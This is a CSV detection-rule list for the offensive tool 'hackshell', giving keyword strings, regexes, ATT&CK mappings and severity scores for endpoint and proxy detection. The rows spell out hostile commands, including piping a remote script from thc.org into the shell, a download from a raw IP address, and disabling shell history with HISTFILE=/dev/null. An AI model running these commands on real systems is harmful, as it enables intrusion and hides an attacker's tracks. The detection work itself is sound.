"keyword","metadata_keyword_regex","metadata_keyword_type","metadata_tool","metadata_description","metadata_tool_techniques","metadata_tool_tactics","metadata_malwares_name","metadata_groups_name","metadata_category","metadata_link","metadata_enable_endpoint_detection","metadata_enable_proxy_detection","metadata_tags","metadata_comment","metadata_severity_score","metadata_popularity_score","metadata_github_stars","metadata_github_forks","metadata_github_updated_at","metadata_github_created_at"
"*hackshell-main.zip*",".{0,1000}hackshell\-main\.zip.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*http://37.120.235.188/blah.tar.gz*",".{0,1000}http\:\/\/37\.120\.235\.188\/blah\.tar\.gz.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*https://bin.ajam.dev//$(uname -m)/bash*",".{0,1000}https\:\/\/bin\.ajam\.dev\/\/\$\(uname\s\-m\)\/bash.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","0","#linux","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh*",".{0,1000}https\:\/\/github\.com\/hackerschoice\/thc\-tips\-tricks\-hacks\-cheat\-sheet\/raw\/master\/tools\/ghostip\.sh.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh*",".{0,1000}https\:\/\/github\.com\/hackerschoice\/thc\-tips\-tricks\-hacks\-cheat\-sheet\/raw\/master\/tools\/whatserver\.sh.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*https://thc.org/hs*",".{0,1000}https\:\/\/thc\.org\/hs.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*nmap -Pn -p* --open -T4 -n -oG - * 2>/dev/null | grep -F Ports*",".{0,1000}nmap\s\-Pn\s\-p.{0,1000}\s\-\-open\s\-T4\s\-n\s\-oG\s\-\s.{0,1000}\s2\>\/dev\/null\s\|\sgrep\s\-F\sPorts.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","0","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1*",".{0,1000}raw\.githubusercontent\.com\/peass\-ng\/PEASS\-ng\/master\/winPEAS\/winPEASps1\/winPEAS\.ps1.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*source <(curl -SsfL https://thc.org/hs)*",".{0,1000}source\s\<\(curl\s\-SsfL\shttps\:\/\/thc\.org\/hs\).{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","0","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*SSH-Hijack (reptyr)*",".{0,1000}SSH\-Hijack\s\(reptyr\).{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","0","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*tinyurl.com/haxshl*",".{0,1000}tinyurl\.com\/haxshl.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","1","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*unset -f hs_init hs_init_alias hs_init_dl hs_init_shell*",".{0,1000}unset\s\-f\shs_init\shs_init_alias\shs_init_dl\shs_init_shell.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","0","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
"*unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color HISTFILE=/dev/null *",".{0,1000}unset\sSSH_CLIENT\sSSH_CONNECTION\;\sTERM\=xterm\-256color\sHISTFILE\=\/dev\/null\s.{0,1000}","offensive_tool_keyword","hackshell","Make BASH stealthy and hacker friendly with lots of bash functions","T1070.003 - T1059.004 - T1564.001 - T1070.004","TA0005 - TA0002","N/A","N/A","Defense Evasion","https://github.com/hackerschoice/hackshell","1","0","N/A","N/A","9","3","236","26","2025-02-27T22:01:02Z","2024-07-16T15:56:11Z"
